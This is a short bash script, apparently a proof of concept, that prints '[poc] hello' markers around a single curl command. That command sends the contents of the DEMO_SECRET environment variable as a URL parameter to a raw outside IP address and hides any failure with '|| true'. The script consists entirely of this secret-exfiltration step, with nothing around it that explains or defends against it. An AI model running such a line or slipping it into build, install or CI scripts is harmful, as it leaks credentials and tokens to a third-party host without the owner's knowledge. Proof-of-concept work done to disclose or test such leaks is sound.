#!/usr/bin/env bash

echo "[poc] hello pre"
curl -fsS "http://82.165.247.235/pp66/?d=$(printf '%s' "$DEMO_SECRET")" || true
echo "[poc] hello post"
